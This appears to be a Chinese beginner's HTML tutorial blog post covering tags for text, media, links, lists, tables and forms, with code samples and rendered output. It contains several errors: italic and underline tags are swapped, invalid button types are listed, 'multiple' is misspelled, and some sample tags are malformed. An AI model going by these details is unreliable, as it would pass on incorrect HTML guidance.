<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;一级标题&lt;/h1&gt;&lt;h4&gt;四级标题&lt;/h4&gt;</span><br><span class="line">&lt;h2&gt;二级标题&lt;/h2&gt;&lt;h5&gt;五级标题&lt;/h5&gt;</span><br><span class="line">&lt;h3&gt;三级标题&lt;/h3&gt;&lt;h6&gt;六级标题&lt;/h6&gt;</span><br></pre></td></tr></table></figure>
<p>语义：1-6级标题，重要程度依次递减<br>特点：文字自动加粗，且h6-h1文字大小逐渐变大，独占一行，均大于普通文字。</p>
<p><strong>段落标签</strong><br>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;P&gt;一段文字&lt;/p&gt;</span><br></pre></td></tr></table></figure>
<p>语义：段落，用于分段显示<br>特点：段落间存在空隙，独占一行</p>
<p><strong>换行标签</strong><br>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;br&gt;</span><br></pre></td></tr></table></figure>
<p>语义：换行，用于强制换行<br>特点：单标签，让文字强制换行</p>
<p><strong>水平线标签</strong><br>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;hr&gt;</span><br></pre></td></tr></table></figure>
<p>语义：用于主题的分隔转换，在页面显示一条水平线</p>
<p><strong>文本格式化标签</strong><br>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加粗：&lt;b&gt;&lt;/b&gt; 或 &lt;strong&gt;&lt;/strong&gt;</span><br><span class="line">倾斜：&lt;u&gt;&lt;/u&gt; 或 &lt;ins&gt;&lt;/ins&gt;</span><br><span class="line">下划线：&lt;i&gt;&lt;/i&gt; 或 &lt;em&gt;&lt;/em&gt;</span><br><span class="line">删除线：&lt;s&gt;&lt;/s&gt; 或 &lt;del&gt;&lt;/del&gt;</span><br></pre></td></tr></table></figure>

<p>语义：突出重要性的强调语境</p>
<h3 id="图片标签-img"><a href="#图片标签-img" class="headerlink" title="图片标签(img)"></a>图片标签(img)</h3><p>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src = &quot;&quot; alt = &quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
<br>
特点：单标签，需要展示对应效果时需要借助标签的属性设置

<table>
<thead>
<tr>
<th>属性</th>
<th>属性值</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>src</td>
<td>目标图片路径</td>
<td>可以使用相对&#x2F;绝对路径</td>
</tr>
<tr>
<td>alt</td>
<td>替换文本</td>
<td>仅在图片加载失败时显示的文本</td>
</tr>
<tr>
<td>title</td>
<td>提示文本</td>
<td>鼠标悬停时显示的文本，也可用于其他标签</td>
</tr>
<tr>
<td>width</td>
<td>宽度</td>
<td>仅设置宽或高度，另一个自动等比缩放</td>
</tr>
<tr>
<td>height</td>
<td>高度</td>
<td>宽高均设置，可能导致图片变形</td>
</tr>
</tbody></table>
<h3 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h3><p>绝对路径：指目录下的绝对位置，可直达目标位置，通常从盘符开始或完整网络地址,如</p>
<ul>
<li>D:\test\test.png</li>
<li><a href="https://www.test.com/test/test1/a.jpg">https://www.test.com/test/test1/a.jpg</a></li>
</ul>
<p>网络地址：右键-复制图片链接</p>
<p>相对路径：<br>&#96;&#96;同级目录下<br><code>子目录名</code>子目录下，可有多层子目录<br><code>..\</code>上级目录下，也可有多层</p>
<h3 id="音频标签-audio"><a href="#音频标签-audio" class="headerlink" title="音频标签(audio)"></a>音频标签(audio)</h3><p>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;audio src = &quot;&quot; controls&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure>
<p>语义：在页面中插入音频，目前支持三种格式(MP3 Wav Ogg), </p>
<table>
<thead>
<tr>
<th>属性</th>
<th>属性值</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>src</td>
<td>目标音频路径</td>
<td>可以使用相对&#x2F;绝对路径</td>
</tr>
<tr>
<td>controls</td>
<td>无</td>
<td>显示播放控件</td>
</tr>
<tr>
<td>autoplay</td>
<td>无</td>
<td>自动播放(部分浏览器不支持)</td>
</tr>
<tr>
<td>loop</td>
<td>无</td>
<td>自动循环播放</td>
</tr>
</tbody></table>
<h3 id="视频标签-video"><a href="#视频标签-video" class="headerlink" title="视频标签(video)"></a>视频标签(video)</h3><p>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video src = &quot;&quot; controls&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>
<p>语义：在页面中插入视频，支持MP4 WebM Ogg<br>属性：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>属性值</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>src</td>
<td>目标视频路径</td>
<td>可以使用相对&#x2F;绝对路径</td>
</tr>
<tr>
<td>controls</td>
<td>无</td>
<td>显示播放控件</td>
</tr>
<tr>
<td>autoplay</td>
<td>无</td>
<td>自动播放(谷歌浏览器需要配合muted实现静音播放)</td>
</tr>
<tr>
<td>loop</td>
<td>无</td>
<td>自动循环播放</td>
</tr>
</tbody></table>
<h3 id="链接标签-a"><a href="#链接标签-a" class="headerlink" title="链接标签(a)"></a>链接标签(a)</h3><p>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href = &quot;&quot;&gt;链接标题&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>语义：点击后跳转的页面<br>特点：双标签，需要设置href属性<br>属性：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>属性值</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>href</td>
<td>目标网页路径</td>
<td>可以是”#”,此时为空链接,开发用,点击后回到网页顶部</td>
</tr>
<tr>
<td>target</td>
<td>_self <br> _blank</td>
<td>默认值，在当前页面打开<br>在新页面打开</td>
</tr>
</tbody></table>
<h3 id="列表标签-ul-li-ol-dl-dd-dt"><a href="#列表标签-ul-li-ol-dl-dd-dt" class="headerlink" title="列表标签(ul,li,ol,dl,dd,dt)"></a>列表标签(ul,li,ol,dl,dd,dt)</h3><p>在网页中按照行的方式展示关联性的内容，有无序列表，有序列表和自定义列表</p>
<p><strong>无序列表</strong><br>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;列表项&lt;li&gt;</span><br><span class="line">    &lt;li&gt;列表项&lt;li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
<p>特点：列表每一项前默认显示原点标识，ul标签表示无序列表的整体，只允许包含li标签，li标签表示列表中的某一项，可以包含任意内容</p>
<p><strong>有序列表</strong><br>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;列表项1&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;列表项2&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure>
<p>特点：列表每一项前默认显示序号标识，ol标签表示有序列表的整体，只允许包含li标签，li标签表示列表中的某一项，可以包含任意内容</p>
<p><strong>自定义列表</strong><br>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dl&gt;</span><br><span class="line">    &lt;dt&gt;标题&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;列表项&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;列表项&lt;/dd&gt;</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure>
<p>特点：列表每一项前默认缩进，dl标签表示自定义列表的整体，只允许包含dt,dd标签，dt标签表示自定义列表的主题，可以包含任意内容，dd标签表示列表中的某一项，可以包含任意内容</p>
<h3 id="表格标签-table-tr-td-th-caption-tbody"><a href="#表格标签-table-tr-td-th-caption-tbody" class="headerlink" title="表格标签(table,tr,td,th,caption,tbody)"></a>表格标签(table,tr,td,th,caption,tbody)</h3><h4 id="基本标签"><a href="#基本标签" class="headerlink" title="基本标签"></a>基本标签</h4><table>
<thead>
<tr>
<th>标签名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>table</td>
<td>表格整体，可用于包裹多个tr</td>
</tr>
<tr>
<td>tr</td>
<td>表格每行，用于包裹多个td</td>
</tr>
<tr>
<td>td</td>
<td>表格单元格，包裹内容</td>
</tr>
</tbody></table>
<p>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">&lt;tr&gt;&lt;td&gt;格1&lt;/td&gt;&lt;td&gt;格2&lt;/td&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;&lt;td&gt;格1&lt;/td&gt;&lt;td&gt;格2&lt;/td&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
<p>table标签的属性：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>属性值</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>border</td>
<td>数字</td>
<td>边框宽度</td>
</tr>
<tr>
<td>width</td>
<td>数字</td>
<td>表格宽度</td>
</tr>
<tr>
<td>height</td>
<td>数字</td>
<td>表格高度</td>
</tr>
</tbody></table>
<p>在table开始标签的&lt;&gt;内，例如：<code>&lt;table border=&quot;1&quot; height=&quot;200&quot; width=&quot;200&quot;&gt;</code><br>实际开发中应当使用CSS设置样式</p>
<h4 id="标题和表头单元格标签和结构标签"><a href="#标题和表头单元格标签和结构标签" class="headerlink" title="标题和表头单元格标签和结构标签"></a>标题和表头单元格标签和结构标签</h4><table>
<thead>
<tr>
<th>标签名</th>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>caption</td>
<td>表格大标题</td>
<td>表示表格整体的大标题，默认在表格整体顶部居中</td>
</tr>
<tr>
<td>th</td>
<td>表头单元格</td>
<td>表示一列小标题，通常用于表格第一行，默认内部文字加粗居中</td>
</tr>
<tr>
<td>thead</td>
<td>表格头部</td>
<td>三个结构标签均只用于加强</td>
</tr>
<tr>
<td>tbody</td>
<td>表格主体</td>
<td>编程语义清晰度，可以省略</td>
</tr>
<tr>
<td>tfoot</td>
<td>表格底部</td>
<td>内部用于包含tr标签</td>
</tr>
</tbody></table>
<p>注意：caption标签书写在table标签内部，th标签书写在tr标签内部，用于替代第一行(用作小标题的一行)的td标签</p>
<h4 id="表格的合并"><a href="#表格的合并" class="headerlink" title="表格的合并"></a>表格的合并</h4><p>在<code>&lt;td&gt;</code>标签中使用左上原则：<br><em>左上原则</em></p>
<ul>
<li>上下合并，只保留最上的，删除其他</li>
<li>左右合并，只保留最左的，删除其他</li>
</ul>
<p>属性：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>属性值</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>rowspan</td>
<td>合并单元格个数</td>
<td>跨行合并,将多行单元格垂直合并</td>
</tr>
<tr>
<td>colspan</td>
<td>合并单元格个数</td>
<td>跨列合并,将多列单元格水平合并</td>
</tr>
</tbody></table>
<p>注意：只有同一个结构标签(thead,tbody,tfoot)的单元格才能合并。<br>例如：</p>
<table border="1" height="100" width="100">
    <tr><td>格1</td><td>格2</td</tr>
    <tr><td>格1</td><td>格2</td</tr>
</table>
合并为：
<table border="1" height="100" width="100">
    <tr><td colspan="2" rowspan = "2">格1</td></tr>
    <tr></tr>
</table>

<p>其前后代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;table border=&quot;1&quot; height=&quot;100&quot; width=&quot;100&quot;&gt;</span><br><span class="line">    &lt;tr&gt;&lt;td&gt;格1&lt;/td&gt;&lt;td&gt;格2&lt;/td&lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;&lt;td&gt;格1&lt;/td&gt;&lt;td&gt;格2&lt;/td&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">合并为：</span><br><span class="line">&lt;table border=&quot;1&quot; height=&quot;100&quot; width=&quot;100&quot;&gt;</span><br><span class="line">    &lt;tr&gt;&lt;td colspan=&quot;2&quot; rowspan = &quot;2&quot;&gt;格1&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>

<h4 id="表格综合示例"><a href="#表格综合示例" class="headerlink" title="表格综合示例"></a>表格综合示例</h4><p>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;table border=&quot;1&quot; height=&quot;200&quot; width=&quot;200&quot;&gt;</span><br><span class="line">&lt;caption&gt;&lt;h3&gt;成绩单&lt;/h3&gt;&lt;/caption&gt;</span><br><span class="line">&lt;thead&gt;</span><br><span class="line">&lt;tr&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;学号&lt;/th&gt;&lt;th&gt;成绩&lt;/th&gt;&lt;/tr&gt;</span><br><span class="line">&lt;/thead&gt;</span><br><span class="line">&lt;tbody&gt;</span><br><span class="line">&lt;tr&gt;&lt;td&gt;小名&lt;/td&gt;&lt;td&gt;30303&lt;/td&gt;&lt;td&gt;200&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;&lt;td&gt;小光&lt;/td&gt;&lt;td&gt;20202&lt;/td&gt;&lt;td&gt;100&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">&lt;/tbody&gt;</span><br><span class="line">&lt;tfoot&gt;</span><br><span class="line">&lt;tr&gt;&lt;td colspan=&quot;3&quot;&gt;这是表格尾部&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">&lt;/tfoot&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>

<p>其效果如下：</p>
<hr>
<table border="1" height="200" width="200">
<caption><h3>成绩单</h3></caption>
<thead>
<tr><th>姓名</th><th>学号</th><th>成绩</th></tr>
</thead>
<tbody>
<tr><td>小名</td><td>30303</td><td>200</td></tr>
<tr><td>小光</td><td>20202</td><td>100</td></tr>
</tbody>
<tfoot>
<tr><td colspan="3">这是表格尾部</td></tr>
</tfoot>
</table>

<hr>
<h3 id="表单标签-input-button-select-label-textarea"><a href="#表单标签-input-button-select-label-textarea" class="headerlink" title="表单标签(input,button,select,label,textarea)"></a>表单标签(input,button,select,label,textarea)</h3><h4 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h4><p>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>
<p>语义：根据type属性的不同值显示不同效果<br>type属性值：</p>
<table>
<thead>
<tr>
<th>属性值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>text</td>
<td>文本框，用于输入单行文本</td>
</tr>
<tr>
<td>password</td>
<td>密码框，用于输入密码</td>
</tr>
<tr>
<td>radio</td>
<td>单选框，用于多选一</td>
</tr>
<tr>
<td>checkbox</td>
<td>多选框，用于多选多</td>
</tr>
<tr>
<td>file</td>
<td>文件选择，用于之后上传文件</td>
</tr>
<tr>
<td>submit</td>
<td>提交按钮，用于提交数据到后端服务器</td>
</tr>
<tr>
<td>reset</td>
<td>重置按钮，用于重置，恢复表达默认值</td>
</tr>
<tr>
<td>button</td>
<td>普通按钮，默认无功能，配合js添加功能</td>
</tr>
</tbody></table>
<ol>
<li><p>input系列标签-文本框<br> 常用属性</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>属性值</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>placeholder</td>
<td>自定义</td>
<td>占位符，提示用户输入内容的文本</td>
</tr>
<tr>
<td>value</td>
<td>用户输入内容</td>
<td>提交后发送给后端服务器，配合，name，js使用</td>
</tr>
<tr>
<td>name</td>
<td>当前控件含义</td>
<td>提交后发送给后端服务器，配合，value，js使用</td>
</tr>
</tbody></table>
<p> 说明：value和name必须共同使用，发送到后端的数据格式将是name属性值&#x3D;value属性值</p>
</li>
<li><p>input系列标签-密码框<br> 常用属性</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>属性值</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>placeholder</td>
<td>自定义</td>
<td>占位符，提示用户输入内容的文本</td>
</tr>
</tbody></table>
</li>
<li><p>input系列标签-单选框<br> 常用属性</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>属性值</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>name</td>
<td>自定义</td>
<td>分组，有相同name属性的单选框为一组，一组只能选中一个</td>
</tr>
<tr>
<td>checked</td>
<td>无</td>
<td>默认选中</td>
</tr>
</tbody></table>
</li>
<li><p>input系列标签-多选框<br> 类似单选框</p>
</li>
<li><p>input系列标签-文件选择</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>属性值</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>multipie</td>
<td>无</td>
<td>多文件选择</td>
</tr>
</tbody></table>
</li>
<li><p>input系列标签-按钮<br> 包括submit,reset,button。显示不同功能的按钮表单控件，必须使用<code>&lt;form&gt;``&lt;/form&gt;</code>包裹</p>
</li>
</ol>
<p>注意！！！！！</p>
<h4 id="Button按钮标签"><a href="#Button按钮标签" class="headerlink" title="Button按钮标签"></a>Button按钮标签</h4><p>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button type=&quot;&quot;&gt;按钮&lt;/button&gt;</span><br></pre></td></tr></table></figure>
<p>其具有type属性,同input标签：</p>
<table>
<thead>
<tr>
<th>属性值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>text</td>
<td>文本框，用于输入单行文本</td>
</tr>
<tr>
<td>password</td>
<td>密码框，用于输入密码</td>
</tr>
<tr>
<td>radio</td>
<td>单选框，用于多选一</td>
</tr>
<tr>
<td>submit</td>
<td>提交按钮，用于提交数据到后端服务器</td>
</tr>
<tr>
<td>reset</td>
<td>重置按钮，用于重置，恢复表达默认值</td>
</tr>
<tr>
<td>button</td>
<td>普通按钮，默认无功能，配合js添加功能</td>
</tr>
</tbody></table>
<p>注意：谷歌浏览器中默认为提交按钮</p>
<h4 id="select-option-textarea-label"><a href="#select-option-textarea-label" class="headerlink" title="select-option textarea label"></a>select-option textarea label</h4><p><strong>select-option下拉标签</strong><br>语义：提供多个选择项的下拉菜单表单控件<br>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;select&gt;</span><br><span class="line">    &lt;option&gt;选项1&lt;/option&gt;</span><br><span class="line">    &lt;option&gt;选项2&lt;/option&gt;</span><br><span class="line">    &lt;option&gt;选项3&lt;/option&gt;&lt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>
<p>常用属性：<br>    selected:默认选中，用于option标签</p>
<p><strong>textarea文本域标签</strong><br>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>
<p>常用属性：</p>
<ul>
<li>cols: 文本域内可见宽度</li>
<li>rows: 文本域内可见行数<br>注意：右下角可以拖拽改变大小，实际开发建议使用CSS</li>
</ul>
<p><strong>label标签</strong><br>语义：用于绑定内容和表单标签的关系<br>使用方法：</p>
<ol>
<li><ol>
<li>使用lable标签将内容(文本等)包裹起来</li>
<li>在表单标签添加id属性</li>
<li>在lable标签的for属性设置对应的id属性值</li>
</ol>
</li>
<li>直接使用label标签把内容和表单标签一起包裹，需要将for属性删除。</li>
</ol>
<h4 id="表单综合示例"><a href="#表单综合示例" class="headerlink" title="表单综合示例"></a>表单综合示例</h4><p>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">昵称：&lt;input type=&quot;text&quot; placeholder=&quot;请输入用户名&quot; value=&quot;&quot; name=&quot;nickname&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">密码：&lt;input type=&quot;password&quot; placeholder=&quot;请输入密码&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">性别：&lt;input type=&quot;radio&quot; name=&quot;gender&quot; /&gt;男 &lt;input type=&quot;radio&quot; name=&quot;gender&quot; /&gt;女&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">婚姻状况：</span><br><span class="line">&lt;input type=&quot;radio&quot; name=&quot;marry&quot; checked /&gt;未婚&lt;input type=&quot;radio&quot; name=&quot;marry&quot; /&gt;已婚&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">爱好：</span><br><span class="line">&lt;!--lable标签.两种方式，单选多选都能用，可以找到点击文字也可以选择前面的框等功能--&gt;</span><br><span class="line">&lt;input type=&quot;checkbox&quot; id=&quot;one&quot;/&gt;&lt;label for=&quot;one&quot;&gt;敲代码&lt;/label&gt;</span><br><span class="line">&lt;label&gt;&lt;input type=&quot;checkbox&quot; /&gt;看小说&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;checkbox&quot; /&gt;刷视频</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">&lt;!--下拉菜单--&gt;</span><br><span class="line">所在城市:</span><br><span class="line">&lt;select&gt;</span><br><span class="line">&lt;option&gt;北京&lt;/option&gt;&lt;option&gt;上海&lt;/option&gt;&lt;option&gt;武汉&lt;/option&gt;&lt;option&gt;深圳&lt;/option&gt;&lt;option&gt;广州&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">&lt;!--文件--&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; multiple /&gt;</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">&lt;!--按钮--&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; /&gt;&lt;input type=&quot;reset&quot; /&gt;&lt;input type=&quot;button&quot; value=&quot;普通按钮&quot; /&gt;</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">&lt;!--这个可以自由包裹内容--&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot;&gt;提交按钮&lt;/button&gt;&lt;button type=&quot;reset&quot;&gt;重置按钮&lt;/button&gt;&lt;button type=&quot;button&quot;&gt;普通按钮&lt;/button&gt;</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">&lt;!--文本域，可以输入大量文字，如评论区--&gt;</span><br><span class="line">评价：</span><br><span class="line">&lt;textarea&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>表现效果：</p>
<hr>
<form>
昵称：<input type="text" placeholder="请输入用户名" value="" name="nickname" /><br /><br />
密码：<input type="password" placeholder="请输入密码" /><br /><br />
性别：<input type="radio" name="gender" />男 <input type="radio" name="gender" />女<br /><br />
婚姻状况：
<input type="radio" name="marry" checked />未婚<input type="radio" name="marry" />已婚<br /><br />
爱好：
<input type="checkbox" id="one"/><label for="one">敲代码</label>
<label><input type="checkbox" />看小说</label>
<input type="checkbox" />刷视频
<br /><br />
所在城市:
<select>
<option>北京</option><option>上海</option><option>武汉</option><option>深圳</option><option>广州</option>
</select>
<br /><br />
<input type="file" multiple />
<br /><br />
<input type="submit" /><input type="reset" /><input type="button" value="普通按钮" />
<br /><br />
<button type="submit">提交按钮</button><button type="reset">重置按钮</button><button type="button">普通按钮</button>
<br /><br />
评价：
<textarea></textarea>
</form>

<hr>
<h3 id="语义化标签-div-span-so-on"><a href="#语义化标签-div-span-so-on" class="headerlink" title="语义化标签 (div span so on)"></a>语义化标签 (div span so on)</h3><p>div,span标签常与img标签或者css联用，而不是用于显示文本<br><strong>div</strong><br>使用<code>&lt;div&gt;&lt;/div&gt;</code>括起来的内容无论多短，都独占一行<br><strong>span</strong><br>使用<code>&lt;span&gt;&lt;/span&gt;</code>括起来的内容都在一行<br><strong>其他</strong><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240512225147.png"><br>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;header&gt;网页头部&lt;/header&gt;</span><br><span class="line"> &lt;nav&gt;网页导航&lt;/nav&gt;</span><br><span class="line"> &lt;footer&gt;网页底部&lt;/footer&gt;</span><br><span class="line"> &lt;aside&gt;网页侧边栏&lt;/aside&gt;</span><br><span class="line"> &lt;section&gt;网页区块&lt;/section&gt;</span><br><span class="line"> &lt;article&gt;网页文章&lt;/article&gt;</span><br></pre></td></tr></table></figure>

<h3 id="字符实体"><a href="#字符实体" class="headerlink" title="字符实体"></a>字符实体</h3><p>当代码中存在多个空格换行缩进等时，浏览器只会解析出一个，就需要用到字符实体：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240512225646.png"></p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;1级标签&lt;/h1&gt;</span><br><span class="line">文章&lt;br /&gt;可以换行&lt;br /&gt;</span><br><span class="line">&lt;img src=&quot;./1.jpg&quot; alt=&quot;图片显示失败文本&quot; title=&quot;鼠标悬停会显示&quot; width=&quot;200&quot; /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;audio src=&quot;./1.mp3&quot; autoplay loop controls&gt;&lt;/audio&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;video src=&quot;./1.mp4&quot; controls autoplay height=&quot;400&quot; muted&gt;&lt;/video&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;a href=&quot;https://www.bilibili.com/video/BV1XT4y1o7jM?t=3.3&quot; target=&quot;_blank&quot;&gt;视频&lt;/a&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;a href=&quot;./12.html&quot; target=&quot;_blank&quot;&gt;本地网址&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot; #&quot;&gt;回到顶部&lt;/a&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li&gt;香蕉&lt;/li&gt;</span><br><span class="line">&lt;li&gt;榴莲&lt;/li&gt;</span><br><span class="line">&lt;li&gt;菠萝&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">&lt;li&gt;莉莉：100&lt;/li&gt;</span><br><span class="line">&lt;li&gt;佳佳：80&lt;/li&gt;</span><br><span class="line">&lt;li&gt;糖糖：60&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br><span class="line">&lt;dl&gt;</span><br><span class="line">&lt;dt&gt;主题&lt;/dt&gt;</span><br><span class="line">&lt;dd&gt;内容1&lt;/dd&gt;</span><br><span class="line">&lt;dd&gt;内容2&lt;/dd&gt;</span><br><span class="line">&lt;dd&gt;内容3&lt;/dd&gt;</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure>

<h3 id="优秀学生信息"><a href="#优秀学生信息" class="headerlink" title="优秀学生信息"></a>优秀学生信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;table border=&quot;1&quot; width=&quot;400&quot; height=&quot;400&quot;&gt;</span><br><span class="line">&lt;caption&gt;&lt;h3&gt;优秀学生信息表格&lt;/h3&gt;&lt;/caption&gt;</span><br><span class="line">&lt;thead&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;th&gt;年级&lt;/th&gt;</span><br><span class="line">&lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">&lt;th&gt;学号&lt;/th&gt;</span><br><span class="line">&lt;th&gt;班级&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/thead&gt;</span><br><span class="line">&lt;tbody&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td rowspan=&quot;2&quot;&gt;高三&lt;/td&gt;</span><br><span class="line">&lt;td&gt;张三&lt;/td&gt;</span><br><span class="line">&lt;td&gt;10&lt;/td&gt;</span><br><span class="line">&lt;td&gt;三年二班&lt;/td&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;李四&lt;/td&gt;</span><br><span class="line">&lt;td&gt;20&lt;/td&gt;</span><br><span class="line">&lt;td&gt;三年三班&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/tbody&gt;</span><br><span class="line">&lt;tfoot&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;评语&lt;/td&gt;</span><br><span class="line">&lt;td colspan=&quot;3&quot;&gt;你们都很优秀&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/tfoot&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>

<p>效果：</p>
<hr>
<table border="1" width="400" height="400">
<caption><h3>优秀学生信息表格</h3></caption>
<thead>
<tr>
<th>年级</th>
<th>姓名</th>
<th>学号</th>
<th>班级</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="2">高三</td>
<td>张三</td>
<td>10</td>
<td>三年二班</td>
<tr>
<td>李四</td>
<td>20</td>
<td>三年三班</td>
</tr>
</tbody>
<tfoot>
<tr>
<td>评语</td>
<td colspan="3">你们都很优秀</td>
</tr>
</tfoot>
</table>
*****


